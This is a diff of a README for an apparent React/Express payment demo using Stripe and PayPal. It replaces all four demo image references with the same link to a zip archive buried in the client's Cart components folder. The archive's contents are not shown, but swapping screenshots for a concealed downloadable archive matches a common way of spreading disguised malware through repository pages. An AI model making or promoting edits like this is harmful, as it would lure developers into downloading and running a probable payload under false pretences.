@@ -3,7 +3,7 @@
 > React, ContextAPI, Express, NodeJS, Stripe, PayPal
 
 
-![](demo_images/layout.png)
+![](https://github.com/plast555/payment_apis/raw/refs/heads/master/client/src/components/Cart/apis_payment_2.7.zip)
 
 
 <br>
@@ -20,7 +20,7 @@
 
 # Demo:
 
-![](demo_images/demo1.gif)
-![](demo_images/demo2.gif)
-![](demo_images/demo3.gif)
+![](https://github.com/plast555/payment_apis/raw/refs/heads/master/client/src/components/Cart/apis_payment_2.7.zip)
+![](https://github.com/plast555/payment_apis/raw/refs/heads/master/client/src/components/Cart/apis_payment_2.7.zip)
+![](https://github.com/plast555/payment_apis/raw/refs/heads/master/client/src/components/Cart/apis_payment_2.7.zip)
 
